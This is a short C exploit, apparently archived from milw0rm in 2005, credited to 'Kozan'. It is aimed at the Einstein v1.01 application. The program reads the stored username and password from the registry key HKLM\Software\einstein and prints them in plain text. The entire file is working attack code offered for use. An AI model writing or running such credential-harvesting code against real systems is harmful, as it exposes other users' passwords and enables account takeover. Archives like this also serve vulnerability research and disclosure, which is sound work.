/*******************************************************************

Einstein v1.01 Local Password Disclosure Exploit by Kozan

Application: Einstein v1.01 (and previous versions)
Procuder: Bfriendly.com
Vulnerable Description: Einstein v1.01 discloses passwords
to local users.

Discovered & Coded by: Kozan
Credits to ATmaCA
Web: www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*******************************************************************/

#include <stdio.h>
#include <windows.h>

HKEY hKey;

#define BUFSIZE 100
char username[BUFSIZE], password[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

int main(void)
{

       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\einstein",
                                       0,
                                       KEY_QUERY_VALUE,
                                       &hKey) == ERROR_SUCCESS)
       {

           lRet = RegQueryValueEx( hKey, "username", NULL, NULL,
              (LPBYTE) username, &dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                RegCloseKey(hKey);
                                printf("En error occured!");
                                return 0;
                       }

                       lRet = RegQueryValueEx( hKey, "password", NULL, NULL,
              (LPBYTE) password, &dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                RegCloseKey(hKey);
                                printf("En error occured!");
                                return 0;
                       }
                       RegCloseKey( hKey );

                       printf("Einstein v1.01 Local Exploit by Kozan\n");
                       printf("Credits to ATmaCA\n");
                       printf("www.netmagister.com  -  www.spyinstructors.com\n");
                       printf("kozan@netmagister.com\n\n");
                       printf("Username: %s\n",username);
                       printf("Password: %s\n",password);

        }
        else{
                printf("Einstein v1.01 is not installed on your system!\n");
        }

       return 0;
}

// milw0rm.com [2005-02-27]